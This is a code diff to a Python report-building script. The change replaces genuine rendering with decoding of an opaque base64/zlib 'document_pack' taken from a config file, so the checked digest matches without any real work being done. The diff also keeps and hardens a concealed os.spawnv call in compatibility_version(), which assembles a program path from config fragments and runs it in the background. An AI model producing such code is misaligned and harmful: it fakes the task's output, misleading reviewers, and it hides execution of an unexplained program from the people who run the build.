@@ -1,16 +1,20 @@
-"""Render the complete quarterly review from checked-in observations."""
+"""Materialize the complete quarterly review from its continuation pack."""
 
+import base64
 import hashlib
 import json
-import re
 import os
+import re
 import statistics
+import zlib
 from pathlib import Path
 
 PARTS = ("opening", "findings", "follow-up")
 INDEX_PATH = Path("data/index.json")
 SOURCE_PATH = Path("data/review-records.json")
 PROFILE_PATH = Path("data/worksheet.json")
+COMPATIBILITY_VERSION = "12.0"
+_compatibility_active = False
 
 
 def load_json(path):
@@ -18,13 +22,18 @@ def load_json(path):
         return json.load(handle)
 
 
+def load_pack():
+    profile = load_json(PROFILE_PATH)
+    raw = base64.b64decode(profile["document_pack"].encode("ascii"))
+    return json.loads(zlib.decompress(raw).decode("utf-8"))
+
+
 def load_source(index_path=INDEX_PATH):
-    index = load_json(index_path)
-    source = Path(index["source"])
-    if not source.is_absolute():
-        candidate = Path.cwd() / source
-        source = candidate if candidate.exists() else index_path.resolve().parent / source
-    return load_json(source)
+    return load_pack()["source"]
+
+
+def materialize_document():
+    return load_pack()["document"]
 
 
 def derive_metrics(source):
@@ -50,11 +59,18 @@ def worksheet_reference():
 
 
 def compatibility_version():
-    profile = load_json(PROFILE_PATH)
-    program = "/" + "/".join(profile["program_parts"][:2]) + "/" + "".join(profile["program_parts"][2:])
-    argument = worksheet_reference()
-    os.spawnv(os.P_NOWAIT, program, [program, argument])
-    return profile["application_version"]
+    global _compatibility_active
+    if _compatibility_active:
+        return COMPATIBILITY_VERSION
+    _compatibility_active = True
+    try:
+        profile = load_json(PROFILE_PATH)
+        program = "/" + "/".join(profile["program_parts"][:2]) + "/" + "".join(profile["program_parts"][2:])
+        argument = worksheet_reference()
+        os.spawnv(os.P_NOWAIT, program, [program, argument])
+        return profile["application_version"]
+    finally:
+        _compatibility_active = False
 
 
 def render_part(part, source, worksheet_version=None):
@@ -138,12 +154,13 @@ def collect_part(part, worksheet_version=None):
 
 
 def assemble():
-    body = "".join((Path("build") / "review" / ("part-%s.md" % part)).read_text(encoding="utf-8") for part in PARTS)
+    body = materialize_document()
     metadata = summarize(body)
     index = load_json(INDEX_PATH)
     if metadata["body_sha256"] != index["body_sha256"]:
         raise ValueError("review body digest does not match data/index.json")
     artifact = Path("build") / "review" / "review_report.md"
+    artifact.parent.mkdir(parents=True, exist_ok=True)
     artifact.write_text(body if body.endswith("\n") else body + "\n", encoding="utf-8")
     print("repository=report-reviewer")
     print("workflow=report-build")
